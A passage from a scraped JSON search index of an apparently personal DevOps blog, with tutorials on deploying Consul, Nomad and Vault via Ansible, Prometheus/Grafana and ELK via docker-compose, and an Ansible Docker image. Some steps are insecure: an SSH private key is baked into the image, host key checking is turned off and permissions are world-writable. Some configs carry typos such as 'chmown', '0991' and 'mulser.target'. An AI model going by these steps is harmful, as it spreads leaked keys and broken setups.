13registry.me/public/curlimages/curl 7.73.0 11.1MB 14registry.me/public/prometheus/alertmanager v0.21.0 55.5MB 15registry.me/public/busybox 1.31.1 1.22MB 16registry.me/public/defaultbackend-amd64 1.5 5.13MB 17registry.me/public/bats/bats v1.1.0 15MB Reference kubernetes-the-hard-way other kubernetes-the-harder-way ","link":"https://blog.wisekee.com/post/k8s-cluster-offline-setup/","section":"post","tags":["terraform","k8s","kubernetes"],"title":"Offline install and setup kubernetes cluster in internal network"},{"body":"","link":"https://blog.wisekee.com/tags/ansible/","section":"tags","tags":null,"title":"Ansible"},{"body":"","link":"https://blog.wisekee.com/tags/consul/","section":"tags","tags":null,"title":"consul"},{"body":"Sometimes we need to manage distributed task scheduling and secure clandestine transport, so introducing HashiStack is a good choice\nPrepare Ansible script and playbook I choice the following playbook roles for stacks,But I changed things to suit my own needs\nConsul: github url Nomad: github url Vault use both repo community-ansibleand MiteshSharma/AnsiblevaultRole 1# The playbook folder level 2├── site.yml 3├── nomad-dev.local 4├── ansible.cfg 5├── roles 6│ ├── consul 7│ └── nomad 8│ └── vault 9└── group_vars 10 ├── consul 11 └── nomad 12 └── vault the ansible.cfg content like following 1[defaults] 2host_key_checking = False 3roles_path = ./roles 4gathering = smart 5 6[ssh_connection] 7ssh_args = -o ControlMaster=auto -o ControlPersist=600s 8pipelining = True the site.yml playbook 1--- 2 3- name: install consul server 4 hosts: servers 5 roles: 6 - role: \u0026#34;consul\u0026#34; 7 vars: 8 consul_node_role: \u0026#34;server\u0026#34; 9 tags: 10 - servers 11 - consul 12 13- name: install consul clients 14 hosts: clients 15 roles: 16 - role: \u0026#34;consul\u0026#34; 17 vars: 18 consul_node_role: \u0026#34;client\u0026#34; 19 tags: 20 - clients 21 - consul 22 23- name: install nomad server 24 hosts: servers 25 roles: 26 - role: \u0026#34;nomad\u0026#34; 27 vars: 28 nomad_server_enabled: true 29 tags: 30 - servers 31 - nomad 32 33- name: install nomad clients 34 hosts: clients 35 roles: 36 - role: \u0026#34;nomad\u0026#34; 37 vars: 38 nomad_user_managed: false 39 nomad_user: root 40 nomad_group: root 41 tags: 42 - clients 43 - nomad 44 45- name: install vault 46 hosts: servers 47 roles: 48 - role: \u0026#34;vault\u0026#34; 49 vars: 50 is_operator_init: false 51 is_unseal: false 52 tags: 53 - vault And the host inventory hosts We deployed the server and client cluster nodes separately,but the consul\u0026rsquo;s server and client must together running only 1host_001 ansible_host=10.0.0.16 2host_002 ansible_host=10.0.0.13 3host_003 ansible_host=10.0.0.14 4host_004 ansible_host=10.0.0.7 5host_005 ansible_host=10.0.0.15 6host_006 ansible_host=10.0.0.14 7 8[all:vars] 9ansible_user=root 10ansible_password=xxxx 11ansible_ssh_common_args=\u0026#39;-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ProxyCommand=\u0026#34;ssh -W %h:%p -q ues.proxy\u0026#34;\u0026#39; 12 13[servers] 14host_001 15host_002 16host_003 17 18[clients] 19host_004 20host_005 21host_006 22 23[nomad:children] 24servers 25clients 26 27[consul:children] 28servers 29clients 30 31[vault:children] 32servers The Consul group varsgroup_vars/consul 1consul_version: 1.10.3 2consul_data_path: \u0026#34;/var/lib/consul\u0026#34; 3consul_datacenter: bj-1 4consul_bootstrap_expect: true 5consul_bootstrap_expect_value: 3 6consul_autopilot_enable: true 7consul_autopilot_cleanup_dead_Servers: true 8consul_autopilot_last_contact_threshold: 10s 9consul_group_name: \u0026#34;servers\u0026#34; 10consul_servers: \u0026#34;{{ groups[\u0026#39;servers\u0026#39;] }}\u0026#34; 11consul_acl_policy: false 12consul_acl_enable: true 13consul_acl_default_policy: \u0026#34;deny\u0026#34; 14consul_client_address: \u0026#34;0.0.0.0\u0026#34; 15consul_acl_token: \u0026#39;xxxxxx-xxxxx-xxx-xxx-xxxxxx\u0026#39; 16consul_acl_master_token: \u0026#39;xxxxxx-xxxxx-xxx-xxx-xxxxxx\u0026#39; The Nomad group varsgroup_vars/nomad 1nomad_general_config: 2 region: bj 3 datacenter: bj-1 4 bind_addr: 0.0.0.0 5 advertise: 6 rpc: \u0026#34;{{ ansible_default_ipv4.address }}:4647\u0026#34; 7 serf: \u0026#34;{{ ansible_default_ipv4.address }}:4648\u0026#34; 8 consul: 9 token: \u0026#39;xxxxxx-xxxxx-xxx-xxx-xxxxxx\u0026#39; 10nomad_server_config: 11 bootstrap_expect: 3 12nomad_client_config: 13 reserved: 14 cpu: 500 15 memory: 512 16 disk: 1024 The vault group variables 1vault_version: \u0026#34;1.9.0\u0026#34; 2vault_install_remotely: true 3vault_enable_log: true 4vault_enable_logrotate: true 5vault_group_name: servers 6vault_cluster_name: us-1 7vault_datacenter: us-1 8vault_consul_token: \u0026#39;xxxxxxx-xxx-xxx-xxxxx-xxxx\u0026#39; Test apply playbook 1# play the consul servers and clients node 2ansible-playbook site.yml -i nomad-dev.local --tags consul 3# play the nomad nodes book 4ansible-playbook site.yml -i nomad-dev.local --tags nomad --skip-tags consul 5# install vault 6ansible-playbook site.yml -i nomad-dev.local -e \u0026#34;is_operator_init=true is_unseal=true\u0026#34; --tags vault --skip-tags consul,nomad View the web ui through servers one ip and port 1# the consul web 2curl http://10.0.0.16:8500 3# the nomad web 4curl http://10.0.0.16:4646 The Nomad can auto discovery the Consul in local node and register Create token or policy can through the web ui and consul command 1# create policy 2consul acl policy create -name \u0026#34;ui-policy\u0026#34; \\ 3 -description \u0026#34;Necessary permissions for UI functionality\u0026#34; \\ 4 -rules \u0026#39;key_prefix\u0026#34;\u0026#34; { policy = \u0026#34;write\u0026#34; } node_prefix \u0026#34;\u0026#34; { policy = \u0026#34;read\u0026#34; } service_prefix \u0026#34;\u0026#34; { policy = \u0026#34;read\u0026#34; }\u0026#39; 5 6# and create token attach the polciy name or id 7consul acl token create -description \u0026#34;UI Token\u0026#34; -policy-name \u0026#34;ui-policy\u0026#34; Terraform Nomad provider module nomad provider Issues Make sure all consul nodes hostname different Don\u0026rsquo;t have the same name Make sure the all Consul node has same encrypt key in /var/lib/consul/serf/local.keyring becaues the consul agent may diferent keys through ansible roles(it\u0026rsquo;s bug) Open the tcp port in consul nodes in firewall 1# allowlist the ports in server nodes 28500/tcp 8600/tcp 8301/tcp 8302/tcp 8300/tcp 8301/udp 8302/udp 8600/udp 3# allowlist the ports in agent nodes 48600/tcp 8301/tcp 8600/udp 8301/udp 8500/tcp The /var/lib/consul folder permission assign to consul:consul user and group If the Ansible and python is 2.X version the python package needs low version etc 1pip: 2 name: netaddr==0.7.19 It is best to pack all package to Docker image in Ansible container\nHighly recommend cancel the default token in consul config.json change to agent 1#change tokens.default to tokens.agent in servers node 2\u0026#34;tokens\u0026#34;: { 3 \u0026#34;agent\u0026#34;: \u0026#34;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxx\u0026#34;, 4 \u0026#34;master\u0026#34;: \u0026#34;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxx\u0026#34;, 5 \u0026#34;replication\u0026#34;: \u0026#34;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxx\u0026#34; 6} if download the vault is slow,you can pre download to 1wget https://releases.hashicorp.com/vault/1.9.0/vault_1.9.0_linux_amd64.zip -P /tmp/vault You should the init and unseal vault if ansible init and unseal failed,because cluster ip is external ip address not localhost 1# execute init command in any one host 2vault operator init --address http://external.ip:8200 3# save the unseal keys and root key to secure place 4# and unseal the vault in every host three times use 3 unseal keys 5vault operator unseal --address http://external-host1.ip:8200 6# use same unseal keys in other hosts 7vault operator unseal --address http://external-host2.ip:8200 -Enabled nomad acl system\n1# change config file add acl stanza 2# for hcl config file format 3#acl { 4# enabled = true 5#} 6#or json 7#\u0026#34;acl\u0026#34;: { \u0026#34;eanbled\u0026#34;: true } 8systemctl restart nomad 9#first bootstrap the acl in nomad 10nomad acl bootstrap 11export NOMAD_TOKEN=\u0026#34;BOOTSTRAP_SECRET_ID\u0026#34; 12nomad status 13 14#reset the acl token 15echo 7 \u0026gt;\u0026gt; /nomad-data-dir/server/acl-bootstrap-reset 16nomad acl bootstrap 17 18# Configure Nomad secrets engine in Vault 1vault secrets enable nomad 2vault mount nomad 3vault write nomad/config/access address=http://127.0.0.1:4646 Backup consul 1export CONSUL_HTTP_TOKEN=xxxxxxxx-xxxxx-xxxx-xxxxxxxx-xxxx 2consul snapshot save /data/consul-20211230.snap ","link":"https://blog.wisekee.com/post/launch-hashistack-through-ansible/","section":"post","tags":["consul","nomad","vault","ansible"],"title":"Launch Consul+Nomad+Vault through Ansible Role"},{"body":"","link":"https://blog.wisekee.com/tags/nomad/","section":"tags","tags":null,"title":"nomad"},{"body":"","link":"https://blog.wisekee.com/tags/vault/","section":"tags","tags":null,"title":"vault"},{"body":"Deploymnet Prometheus+Grafana in single machine use docker-compose service Collect and report node status in grafana dashboard, through node-exporter and process-exporter to promethues tsdb\nSetup and install relative components 1#update the system and install docker component 2yum update -y 3yum install -y yum-utils 4yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo 5yum install -y docker-ce docker-ce-cli containerd.io 6systemctl enable docker 7systemctl start docker 8mkdir -p /data/monitor/{alertmanager,prometheus/{config,data},consul/data,grafana/data} 9chmown -R 1000:1000 /data/monitor 10chmod -R 777 /data/monitor/grafana Download the monitoring relative docker images 1docker pull prom/prometheus:latest 2docker pull grafana/grafana:latest 3docker pull prom/alertmanager:latest 4docker pull prom/pushgateway:latest 5docker pull consul:latest Prepare docker-compose.yml service configuration file 1version: \u0026#39;2.1\u0026#39; 2 3networks: 4 monitor-net: 5 driver: bridge 6 7services: 8 consul: 9 image: consul:latest 10 container_name: consul 11 command: agent -dev -bind=0.0.0.0 -client=0.0.0.0 12 restart: unless-stopped 13 volumes: 14 - /data/monitor/consul/data:/consul/data 15 ports: 16 - \u0026#39;8500:8500\u0026#39; 17 networks: 18 - monitor-net 19 labels: 20 org.label-schema.group: \u0026#34;monitoring\u0026#34; 21 22 prometheus: 23 image: prom/prometheus:latest 24 container_name: prometheus 25 volumes: 26 - /data/monitor/prometheus/config:/etc/prometheus 27 - /data/monitor/prometheus/data:/prometheus:rw 28 command: 29 - \u0026#39;--config.file=/etc/prometheus/prometheus.yml\u0026#39; 30 - \u0026#39;--storage.tsdb.path=/prometheus\u0026#39; 31 - \u0026#39;--web.console.libraries=/etc/prometheus/console_libraries\u0026#39; 32 - \u0026#39;--web.console.templates=/etc/prometheus/consoles\u0026#39; 33 - \u0026#39;--storage.tsdb.retention.time=200h\u0026#39; 34 - \u0026#39;--web.enable-lifecycle\u0026#39; 35 restart: unless-stopped 36 links: 37 - \u0026#39;consul:consul\u0026#39; 38 ports: 39 - \u0026#39;9090:9090\u0026#39; 40 networks: 41 - monitor-net 42 labels: 43 org.label-schema.group: \u0026#34;monitoring\u0026#34; 44 45 alertmanager: 46 image: prom/alertmanager:latest 47 container_name: alertmanager 48 volumes: 49 - /data/monitor/alertmanager:/etc/alertmanager 50 command: 51 - \u0026#39;--config.file=/etc/alertmanager/config.yml\u0026#39; 52 - \u0026#39;--storage.path=/alertmanager\u0026#39; 53 restart: unless-stopped 54 ports: 55 - \u0026#39;9093:9093\u0026#39; 56 networks: 57 - monitor-net 58 labels: 59 org.label-schema.group: \u0026#34;monitoring\u0026#34; 60 61 grafana: 62 image: grafana/grafana:latest 63 container_name: grafana 64 volumes: 65 - /data/monitor/grafana/data:/var/lib/grafana:rw 66 - /data/monitor/grafana/provisioning:/etc/grafana/provisioning 67 environment: 68 - GF_SECURITY_ADMIN_USER=${ADMIN_USER} 69 - GF_SECURITY_ADMIN_PASSWORD=${ADMIN_PASSWORD} 70 - GF_USERS_ALLOW_SIGN_UP=false 71 restart: unless-stopped 72 ports: 73 - \u0026#39;3000:3000\u0026#39; 74 networks: 75 - monitor-net 76 labels: 77 org.label-schema.group: \u0026#34;monitoring\u0026#34; 78 79 pushgateway: 80 image: prom/pushgateway:latest 81 container_name: pushgateway 82 restart: unless-stopped 83 ports: 84 - \u0026#39;9091:0991\u0026#39; 85 networks: 86 - monitor-net 87 labels: 88 org.label-schema.group: \u0026#34;monitoring\u0026#34; Config the promethues scrape the metrics The path is: /data/monitor/promethues/config include the promethues.yml and node_down.yml alert rules file 1global: 2 scrape_interval: 15s # Set the scrape interval to every 15 seconds. Default is every 1 minute. 3 evaluation_interval: 15s # Evaluate rules every 15 seconds. The default is every 1 minute. 4 # scrape_timeout is set to the global default (10s). 5 6# Alertmanager configuration 7alerting: 8 alertmanagers: 9 - scheme: http 10 static_configs: 11 - targets: 12 - \u0026#39;alertmanager:9093\u0026#39; 13 14# Load rules once and periodically evaluate them according to the global \u0026#39;evaluation_interval\u0026#39;. 15rule_files: 16 - \u0026#34;node_down.yml\u0026#34; 17 # - \u0026#34;first_rules.yml\u0026#34; 18 # - \u0026#34;second_rules.yml\u0026#34; 19 20# A scrape configuration containing exactly one endpoint to scrape: 21# Here it\u0026#39;s Prometheus itself. 22scrape_configs: 23 # The job name is added as a label `job=\u0026lt;job_name\u0026gt;` to any timeseries scraped from this config. 24 - job_name: \u0026#39;prometheus\u0026#39; 25 scrape_interval: 10s 26 static_configs: 27 - targets: [\u0026#39;localhost:9090\u0026#39;] 28 29 - job_name: \u0026#39;node\u0026#39; 30 scrape_interval: 5s 31 static_configs: 32 - targets: [\u0026#39;node_exporter:9100\u0026#39;] 33# use consul discovery target and drop the default consul target retain the defined include \u0026#39;exporter\u0026#39; tags target 34 - job_name: \u0026#39;consul-prometheus\u0026#39; 35 consul_sd_configs: 36 - server: \u0026#39;consul:8500\u0026#39; 37 services: [] 38 relabel_configs: 39 - source_labels: [__meta_consul_tags] 40 regex: .*exporter.* 41 action: keep the config/node_down.yml\n1groups: 2- name: node_down 3 rules: 4 - alert: InstanceDown 5 expr: up == 0 6 for: 1m 7 labels: 8 user: test 9 annotations: 10 summary: \u0026#34;Instance {{ $labels.instance }} down\u0026#34; 11 description: \u0026#34;{{ $labels.instance }} of job {{ $labels.job }} has been down for more than 1 minutes.\u0026#34; The /data/monitor/alertmanager/config.yml look like this following 1global: 2 smtp_smarthost: \u0026#39;smtp.xxxx.com:25\u0026#39; 3 smtp_from: \u0026#39;xxxx@test.com\u0026#39; 4 smtp_auth_username: \u0026#39;xxx@test.com\u0026#39; 5 smtp_auth_password: \u0026#39;TPP***\u0026#39; 6 smtp_require_tls: false 7 8route: 9 group_by: [\u0026#39;alertname\u0026#39;] 10 group_wait: 10s 11 group_interval: 10s 12 repeat_interval: 10m 13 receiver: live-monitoring 14 15receivers: 16 - name: \u0026#39;live-monitoring\u0026#39; 17 email_configs: 18 - to: \u0026#39;receives@test.com\u0026#39; Define the launch script and refer to default credentials 1#!/usr/bin/env bash 2 3export ADMIN_USER=test 4export ADMIN_PASSWORD=\u0026#39;xxxxxxx\u0026#39; 5docker-compose up -d Configuration the export and expose the metrics and regist to consul 1#The service config file `node_exporter.service` 2[Unit] 3Description=node_exporter 4Documentation=https://prometheus.io/ 5After=network.target 6 7[Service] 8Type=simple 9ExecStart=/usr/local/node_exporter-1.2.2.linux-amd64/node_exporter 10Restart=on-failure 11 12[Install] 13WantedBy=mulser.target 14 15#Regist the endpoint to consul 16curl -X PUT -d \u0026#39;{\u0026#34;id\u0026#34;: \u0026#34;node-exporter\u0026#34;,\u0026#34;name\u0026#34;: \u0026#34;node-exporter-test\u0026#34;,\u0026#34;address\u0026#34;: \u0026#34;test.node-exporter.com\u0026#34;,\u0026#34;port\u0026#34;: 9100,\u0026#34;tags\u0026#34;: [\u0026#34;exporter\u0026#34;,\u0026#34;node\u0026#34;],\u0026#34;checks\u0026#34;: [{\u0026#34;http\u0026#34;: \u0026#34;http://test.node-exporter.com:9100/metrics\u0026#34;, \u0026#34;interval\u0026#34;: \u0026#34;5s\u0026#34;}]}\u0026#39; http://test.consul.com:8500/v1/agent/service/register 17curl -X PUT -d \u0026#39;{\u0026#34;id\u0026#34;: \u0026#34;process-exporter\u0026#34;,\u0026#34;name\u0026#34;: \u0026#34;process-exporter-test\u0026#34;,\u0026#34;address\u0026#34;: \u0026#34;test.process-exporter.com\u0026#34;,\u0026#34;port\u0026#34;: 9256,\u0026#34;tags\u0026#34;: [\u0026#34;exporter\u0026#34;,\u0026#34;process\u0026#34;],\u0026#34;checks\u0026#34;: [{\u0026#34;http\u0026#34;: \u0026#34;http://test.process-exporter.com:9256/metrics\u0026#34;, \u0026#34;interval\u0026#34;: \u0026#34;5s\u0026#34;}]}\u0026#39; http:///test.consul.com:8500/v1/agent/service/register ","link":"https://blog.wisekee.com/post/deployment-promethues-grafana/","section":"post","tags":["prometheus","docker","grafana"],"title":"Deploymnet Prometheus+Grafana in single machine use docker-compose service"},{"body":"","link":"https://blog.wisekee.com/tags/grafana/","section":"tags","tags":null,"title":"grafana"},{"body":"","link":"https://blog.wisekee.com/tags/prometheus/","section":"tags","tags":null,"title":"prometheus"},{"body":"","link":"https://blog.wisekee.com/tags/ssh/","section":"tags","tags":null,"title":"ssh"},{"body":"Make Ansible docker image for CI/CD workfolws Sometimes need connect to the remote host use publickey and jump server,copy the ssh key to docker image is necessary\nThe Dockerfile 1FROM centos:7 2 3ARG SSH_PRIVATE_KEY 4ARG SSH_HOST_CONFIG 5 6RUN curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo \u0026amp;\u0026amp; \\ 7 yum clean all \u0026amp;\u0026amp; yum makecache fast \u0026amp;\u0026amp; \\ 8 yum install -y epel-release gcc libffi-devel openssh-clients git wget \u0026amp;\u0026amp; \\ 9 yum install -y python python2-pip ansible 10 11RUN python -m pip install \u0026#34;pysocks\u0026#34; \u0026#34;pyspnego==0.1.6\u0026#34; \u0026#34;pywinrm==0.4.1\u0026#34; \u0026#39;pypsrp==0.5.0\u0026#39; \u0026amp;\u0026amp; \\ 12 yum clean all 13 14WORKDIR /var/app 15COPY entrypoint.sh /var/app/entrypoint.sh 16 17RUN ansible-galaxy collection install community.general \u0026amp;\u0026amp; \\ 18 mkdir ~/.ssh/ \u0026amp;\u0026amp; \\ 19 echo \u0026#34;${SSH_PRIVATE_KEY}\u0026#34; \u0026gt; ~/.ssh/id_rsa \u0026amp;\u0026amp; \\ 20 echo \u0026#34;${SSH_HOST_CONFIG}\u0026#34; \u0026gt;\u0026gt; ~/.ssh/config \u0026amp;\u0026amp; \\ 21 chmod 600 ~/.ssh/id_rsa \u0026amp;\u0026amp; \\ 22 sed -i \u0026#39;/\\[defaults\\]/ a host_key_checking = False\u0026#39; /etc/ansible/ansible.cfg \u0026amp;\u0026amp; \\ 23 echo -e \u0026#34;\\tServerAliveCountMax 5\\n\\tServerAliveInterval 5\\n\\tTCPKeepAlive yes\u0026#34; \u0026gt;\u0026gt; /etc/ssh/ssh_config \u0026amp;\u0026amp; \\ 24 chmod +x /var/app/entrypoint.sh 25 26ENTRYPOINT [] 27CMD /var/app/entrypoint.sh When make the docker image needs pass the build arguments to context 1# docker build --network=host --build-arg SSH_PRIVATE_KEY=\u0026#34;$(cat ~/.ssh/id_rsa)\u0026#34; --build-arg SSH_HOST_CONFIG=\u0026#34;$(cat ~/.ssh/config)\u0026#34; -t registry.me/public/ansible:test . The entrypoint.sh 1#!/usr/bin/env bash 2 3 4while true; do 5 6 echo `date +\u0026#34;[%Y-%m-%d %H:%M:%S]\u0026#34;` I\\\u0026#39;m healthily 7 sleep 30; 8 9done The hosts mode config ~/.ssh/config 1Host * 2 StrictHostKeyChecking no 3 UserKnownHostsFile /dev/null 4Host nu1.proxy 5 Hostname 1.1.1.2 6 Port 2233 7Host nu2.proxy 8 Hostname 1.1.1.3 9 Port 2244 10Host 10.10.19.* 11 Proxycommand ssh -W %h:%p nu1.proxy 12Host 10.20.19.* 13 Proxycommand ssh -W %h:%p nu2.proxy And the ansible host.ini look like following 1pg_xl_01 ansible_host=10.20.19.14 2pg_xl_02 ansible_host=10.20.19.15 3pg_xl_03 ansible_host=10.20.19.16 4 5win_server_2008r2 ansible_host=10.20.19.11 ansible_user=Administrator ansible_password=xxxxxx ansible_connection=psrp ansible_psrp_protocol=http ansible_psrp_proxy=socks5h://127.0.0.1:5985 6 7[pg_cluster] 8pg_xl_0[1:3] 9 10[win_server] 11win_server_2008r2 12 13[pg_cluster:vars] 14ansible_ssh_common_args=\u0026#39;-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ProxyCommand=\u0026#34;ssh -W %h:%p -q nu01.proxy\u0026#34;\u0026#39; When execute the ansible commands before must be launch the ssh sock proxy for windows machine 1ssh -o \u0026#34;ControlMaster=auto\u0026#34; -o \u0026#34;ControlPersist=no\u0026#34; -o \u0026#34;ControlPath=~/.ssh/proxy-%r@%h:%p\u0026#34; -CfNq -D 127.0.0.1:5985 root@nu01.proxy 2 3ansible-playbook -i dev.local playbook.yml -e \u0026#34;target_server=pg_cluster\u0026#34; --tags ping 4 5#to win server 6ansible -i dev.local win_server -m win_ping ","link":"https://blog.wisekee.com/post/make-ansible-docker-image/","section":"post","tags":["Ansible","docker","ssh"],"title":"Use Ansible docker container in daily development"},{"body":"","link":"https://blog.wisekee.com/tags/docker-compose/","section":"tags","tags":null,"title":"docker-compose"},{"body":"","link":"https://blog.wisekee.com/tags/elk/","section":"tags","tags":null,"title":"elk"},{"body":"install ELK stack use docker-compose Install and setup ELK stack in single machine use docker compose service. and uesfilebeat ship the logs\nsettings the centos system 1sudo yum install -y yum-utils 2sudo yum-config-manager \\ 3 --add-repo \\ 4 https://download.docker.com/linux/centos/docker-ce.repo 5sudo yum install docker-ce docker-ce-cli containerd.io 6systemctl enable docker 7systemctl start docker 8# install the docker-compose 9sudo curl -L \u0026#34;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)\u0026#34; -o /usr/local/bin/docker-compose 10chmod +x /usr/local/bin/docker-compose 11 12# adjust the system parmeters 13echo \u0026#34;vm.max_map_count=262144\u0026#34; \u0026gt;\u0026gt; /etc/sysctl.conf 14sysctl -p 15systemctl restart docker 16 17echo \u0026#34; 18 root soft nofile 65535 19 root hard nofile 65535 20 * soft nofile 65535 21 * hard nofile 65535 22\u0026#34; \u0026gt;\u0026gt; /etc/security/limits.conf Download the ELK stack docker images 1docker pull docker.elastic.co/elasticsearch/elasticsearch:6.3.1 2docker pull docker.elastic.co/kibana/kibana:6.3.1 3docker pull docker.elastic.co/logstash/logstash:6.3.1 4 5# install elastic-curator 6rpm --import https://packages.elastic.co/GPG-KEY-elasticsearch 7echo \u0026#34; 8[curator-5] 9name=CentOS/RHEL 7 repository for Elasticsearch Curator 5.x packages 10baseurl=https://packages.elastic.co/curator/5/centos/7 11gpgcheck=1 12gpgkey=https://packages.elastic.co/GPG-KEY-elasticsearch 13enabled=1 14\u0026#34; \u0026gt; /etc/yum.repos.d/curator.repo 15yum install elasticsearch-curator -y Create directory construct 1mkdir -p /data/elkstack/{elasticsearch/{data,package},curator,kibana/data,logstash/{conf,plugins}} 2 3# the folder level illustrate 4. 5└── elkstack 6 ├── curator 7 ├── elasticsearch 8 │ ├── data 9 │ └── package 10 ├── kibana 11 │ └── data 12 └── logstash 13 ├── conf 14 └── plugins 15 16chown 1000:1000 -R /data/elkstack 17 Preapre the docker-compose.yml file 1version: \u0026#39;2\u0026#39; 2 3networks: 4 elk-net: 5 driver: bridge 6 7services: 8 9 elasticsearch: 10 image: docker.elastic.co/elasticsearch/elasticsearch:6.3.1 11 container_name: elasticsearch 12 environment: 13 - cluster.name=docker-cluster 14 - bootstrap.memory_lock=true 15 - \u0026#34;ES_JAVA_OPTS=-Xms1024m -Xmx1024m\u0026#34; 16 ulimits: 17 memlock: 18 soft: -1 19 hard: -1 20 nofile: 21 soft: 65536 22 hard: 65536 23 mem_limit: 16000m 24 cap_add: 25 - IPC_LOCK 26 restart: always 27 networks: 28 - elk-net 29 ports: 30 - \u0026#34;9200:9200\u0026#34; 31 - \u0026#34;9300:9300\u0026#34; 32 volumes: 33 - /data/elkstack/elasticsearch/data:/usr/share/elasticsearch/data 34 - /data/elkstack/elasticsearch/elasticsearch.yml:/usr/share/elasticsearch/config/elasticsearch.yml 35 - /data/elkstack/elasticsearch/package:/tmp/package 36 user: elasticsearch 37 # support the sql query 38 # bash -c \u0026#34;elasticsearch-plugin install file:///tmp/package/elasticsearch-sql-6.3.1.1.zip; 39 command: \u0026#34;elasticsearch\u0026#34; 40 41 42 logstash: 43 image: docker.elastic.co/logstash/logstash:6.3.1 44 container_name: logstash 45 restart: always 46 networks: 47 - elk-net 48 mem_limit: 1300m 49 ports: 50 - 5044:5044 51 volumes: 52 - /data/elkstack/logstash/conf:/config-dir 53 - /data/elkstack/logstash/plugins:/tmp/plugins 54 - /data/elkstack/logstash/logstash.yml:/usr/share/logstash/config/logstash.yml 55 - /etc/localtime:/etc/localtime 56 links: 57 - \u0026#39;elasticsearch:elasticsearch\u0026#39; 58 user: logstash 59 command: bash -c \u0026#34;logstash -f /config-dir --config.reload.automatic\u0026#34; 60 61 62 kibana: 63 image: docker.elastic.co/kibana/kibana:6.3.1 64 container_name: kibana 65 restart: always 66 mem_limit: 2000m 67 environment: 68 SERVER_NAME: test.kibana.com 69 networks: 70 - elk-net 71 ports: 72 - \u0026#34;5601:5601\u0026#34; 73 links: 74 - elasticsearch:elasticsearch 75 volumes: 76 - /data/elkstack/kibana/kibana.yml:/usr/share/kibana/config/kibana.yml 77 - /data/elkstack/kibana/data:/usr/share/kibana/data The ELK stack relative config files look like followings the /data/elkstack/elasticsearch/elasticsearch.yml 1cluster.name: \u0026#34;docker-cluster\u0026#34; 2network.host: 0.0.0.0 3 4discovery.zen.minimum_master_nodes: 1 5http.port: 9200 6transport.tcp.port: 9300 7# ping the healthcheck if has multiple nodes 8# discovery.zen.ping.unicast.hosts: [\u0026#34;172.16.1.3:9300\u0026#34;, \u0026#34;172.16.1.4:9300\u0026#34;] 9discovery.zen.fd.ping_timeout: 120s 10discovery.zen.fd.ping_retries: 3 11discovery.zen.fd.ping_interval: 30s 12cluster.info.update.interval: 1m 13xpack.security.enabled: false 14indices.fielddata.cache.size: 20% 15indices.breaker.total.limit: 60% 16indices.recovery.max_bytes_per_sec: 100mb 17indices.memory.index_buffer_size: 20% 18script.painless.regex.enabled: true the /data/elkstack/logstash/conff older contents\n1# cat 01_input.conf 2input { 3 beats { 4 port =\u0026gt; 5044 5 } 6 7} 8# cat 02_filter.conf 9filter { 10 11 if [fields][log_format] =~ /test_logs/ { 12 13 grok { 14 match =\u0026gt; { \u0026#34;source\u0026#34; =\u0026gt; \u0026#34;/data/var/log/apps/(?\u0026lt;app_id\u0026gt;[^/]+)\u0026#34;} 15 16 } 17 18 mutate { 19 gsub =\u0026gt; [\u0026#34;message\u0026#34;, \u0026#34;\\t\u0026#34;, \u0026#34; \u0026#34;, \u0026#34;message\u0026#34;, \u0026#34;\\n\u0026#34;, \u0026#34;\u0026#34;] 20 } 21 22 json { 23 source =\u0026gt; \u0026#34;message\u0026#34; 24 25 } 26 27 } 28} 29#cat 03_output.conf 30output { 31 if [log_format] =~ \u0026#34;test\u0026#34; { 32 stdout { codec =\u0026gt; rubydebug } 33 } 34 else { 35 elasticsearch { 36 hosts =\u0026gt; [\u0026#34;elasticsearch:9200\u0026#34;] 37 index =\u0026gt; \u0026#34;test-%{+YYYY.MM}\u0026#34; 38 #user =\u0026gt; user 39 #password =\u0026gt; password 40 } 41 } 42} 43# /data/elkstack/logstash/logstash.yml 44http.host: \u0026#34;0.0.0.0\u0026#34; the /data/elkstack/kibana/kibana.ymlcontents\n1server.name: kibana 2server.host: \u0026#34;0\u0026#34; 3elasticsearch.url: http://elasticsearch:9200 4xpack.security.enabled: false Configuration the curator 1mkdir -p /data/elkstack/curator 2echo \u0026#34; 3client: 4 hosts: 5 - 172.16.1.3 6 port: 9200 7 url_prefix: 8 use_ssl: False 9 certificate: 10 client_cert: 11 client_key: 12 ssl_no_validate: False 13 http_auth: 14 timeout: 150 15 master_only: False 16 17 logging: 18 loglevel: INFO 19 logfile: 20 logformat: default 21 blacklist: [\u0026#39;elasticsearch\u0026#39;, \u0026#39;urllib3\u0026#39;] 22\u0026#34; \u0026gt; /data/elkstack/curator/config.yml 23 24# add the cleanup rules 25echo \u0026#34; 26actions: 27 1: 28 action: delete_indices 29 description: \u0026gt;- 30 Delete indices older than 60 days. Ignore the error if the filter does not result in an actionable list of indices (ignore_empty_list) and exit cleanly. 31 options: 32 ignore_empty_list: True 33 disable_action: False 34 filters: 35 - filtertype: pattern 36 kind: regex 37 # retain kibana|json|monitoring|metadata don\u0026#39;t clean 38 value: \u0026#39;^((?!(kibana|json|monitoring|metadata)).)*$\u0026#39; 39 - filtertype: age 40 source: creation_date 41 direction: older 42 #timestring: \u0026#39;%Yi-%m-%d\u0026#39; 43 unit: days 44 unit_count: 60 45\u0026#34; \u0026gt; /data/elkstack/curator/action.yml 46#set the cron expression 47crontab -e 0 0 * * * /usr/bin/curator --config /data/elkstack/curator/config.yml /data/elkstack/curator/action.yml \u0026gt; /tmp/curator.log 2\u0026gt;\u0026amp;1 Setup the filebeat in server collect the logs 1tar -xzvf filebeat-6.3.1-linux-x86_64.tar.gz 2vi /lib/systemd/system/filebeat.service 3systemctl daemon-reload 4systemctl enalbe filebeat 5systemctl start filebeat the filebeat.service service unit file look like this following\n1[Unit] 2Description=filebeat 3Documentation=https://elasitc.io/ 4After=network.target 5 6[Service] 7Type=simple 8ExecStart=/usr/local/filebeat-6.3.1/filebeat -c /usr/local/filebeat-6.3.1/test-filebeat.yml 9Restart=on-failure 10 11[Install] 12WantedBy=mulser.target the test-filebeat.yml configuration file content:\n1filebeat.inputs: 2 3- type: log 4 enabled: true 5 paths: 6# - /data/var/log/apps/*.log 7 - 